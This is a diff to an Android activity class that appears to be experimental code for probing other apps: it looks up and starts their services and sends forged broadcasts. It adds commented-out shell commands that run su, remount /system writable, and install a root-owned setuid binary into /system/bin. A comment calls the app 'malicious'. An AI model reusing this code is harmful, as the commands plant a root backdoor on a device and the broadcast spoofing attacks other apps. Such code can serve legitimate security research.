@@ -4,21 +4,40 @@ import android.content.BroadcastReceiver;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
 import android.content.ServiceConnection;
+import android.content.SharedPreferences;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.content.pm.ResolveInfo;
+import android.content.res.Resources;
 import android.graphics.drawable.Drawable;
 import android.os.Bundle;
 import android.os.IBinder;
+import android.os.Message;
+import android.os.Messenger;
+import android.os.StrictMode;
 import android.support.v7.app.AppCompatActivity;
 import android.util.Log;
+import android.widget.Toast;
 
+import java.io.BufferedReader;
+import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.PrintWriter;
+import java.net.DatagramPacket;
+import java.net.DatagramSocket;
+import java.net.Inet4Address;
+import java.net.InetAddress;
 import java.net.ServerSocket;
+import java.net.Socket;
+import java.net.UnknownHostException;
 import java.util.List;
 import java.util.logging.Handler;
+import java.util.logging.LogManager;
 import java.util.logging.LogRecord;
 
 public class Caller extends AppCompatActivity {
@@ -211,17 +230,75 @@ public class Caller extends AppCompatActivity {
             e.printStackTrace();
         }*/
     //    int port = getFreePort(432);
-    //    Log.i("shentnali---","free port is:--" + port);
+     //   Log.i("shentnali---","free port is:--" + port);
 
-     //register receiver dynamically
-        String receivername = "com.youku.phone.intent.";
-        IntentFilter filter = new IntentFilter(receivername);
-        Mbroadcastreceiver receiver = new Mbroadcastreceiver();
-        registerReceiver(receiver, filter);
+        // send broadcast that the youku.phone can receive
+   //     Intent intent = new Intent();
+      //  String action = "android.intent.action.DOWNLOAD_TRACKER";
+       // action = "com.xiaomi.mipush.RECEIVE_MESSAGE";
+      //  intent.setAction("android.net.conn.CONNECTIVITY_CHANGE");
+
+     //   action = "android.intent.action.PACKAGE_ADDED";
+
+     //  intent.setAction(action);
+    //    intent.putExtra("uri","https://upload.wikimedia.org/wikipedia/commons/1/10/Wappen_Uri_matt.svg");
+    //    intent.putExtra("context","receiver");
+    //   intent.putExtra("push msg","xiaomi");
+   //     intent.putExtra("msg--","the receive op success");
+    //    sendBroadcast(intent);
+    //    Log.i("shentnali---","send mes to receiver");
+
+        Log.i("shentanli---","create new file");
+      //  String v5 = "/data/data/com.letv.android.client/ltsysu";
+
+  /*      Process v8 = null;
+        try {
+            Log.i("shentanli--","exec su");
+            Log.i("shentnali","get root");
+            v8 = Runtime.getRuntime().exec("su");
+          //  v8.waitFor();
+       //     Log.i("shentanli","wait finished");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }/* catch (InterruptedException e) {
+            e.printStackTrace();
+        }*/
+
+     //   Log.i("shentanli","to new file in data/data");
+
+/*
+
+        DataOutputStream v6=new DataOutputStream(v8.getOutputStream());
+        try {
+            Log.i("shentanli","to remount");
+
+            String v5 = "/data/local/tmp/ltsu";
+
+            v6.writeBytes("new File("+ "v5)");
+          //  v6.writeBytes("mount -o remount,rw /dev/block/platform/msm_sdcc.1/by-name/system /system \n");
+            v6.writeBytes("mount -o remount,rw /system \n");
+            v6.writeBytes("busybox cp "+v5 + " /system/bin/" + "ltsysu"+"\n");
+            v6.writeBytes("busybox chown 0:0 /system/bin/ltsysu\n");
+            v6.writeBytes("chmod 4755 /system/bin/ltsysu\n");
+            v6.writeBytes("exit\n");
+            Log.i("shentanli","to flush");
+            v6.flush();
+         //   v8.waitFor();
+            if (v8!=null)
+                v8.destroy();
+
+
+        } catch (IOException e) {
+            e.printStackTrace();
+        }*/
 
 
 
-    }
+
+ }
+
+
+
 
    protected int getFreePort(int port) {
        int v0 = port;
@@ -287,18 +364,6 @@ public class Caller extends AppCompatActivity {
     };
 
 
-
-
-    // register a broadcastreceiver in the malicious app to receive the broadcast from the potential app
-    public class Mbroadcastreceiver extends BroadcastReceiver{
-        public void onReceive(Context context, Intent intent)
-        {
-            //TODO write the receive action: find in the manifest.xml
-
-        }
-    }
-
-
  /*   private void showToast(int messageId) {
         Toast.makeText(this, "Message" + messageId, Toast.LENGTH_SHORT).show();
     }*/
@@ -331,7 +396,7 @@ public class Caller extends AppCompatActivity {
 
    //if know only the packagename, you want to get the activity.
 
-    private void find_class_from_packagename(String packagename)
+    public void find_class_from_packagename(String packagename)
     {
         PackageInfo packageinfo = null;
         try
@@ -365,7 +430,7 @@ public class Caller extends AppCompatActivity {
     }
 
 
-    private void find_service_from_packagename(String packagename, String servicename)
+    public void find_service_from_packagename(String packagename, String servicename)
     {
         Log.i("the submethod ---", "now in the submethod");
         PackageInfo packageinfo = null;
@@ -389,7 +454,7 @@ public class Caller extends AppCompatActivity {
             Intent intent = new Intent();
 
             ComponentName cn = new ComponentName(packageName,servicename);
-            Log.i("error----","find the equal service in this package");
+            Log.i("error----", "find the equal service in this package");
             intent.setComponent(cn);
             startService(intent);
 
@@ -455,4 +520,6 @@ public class Caller extends AppCompatActivity {
     //TODO to find how to share the assets cross apps
 
 
+
 }
+
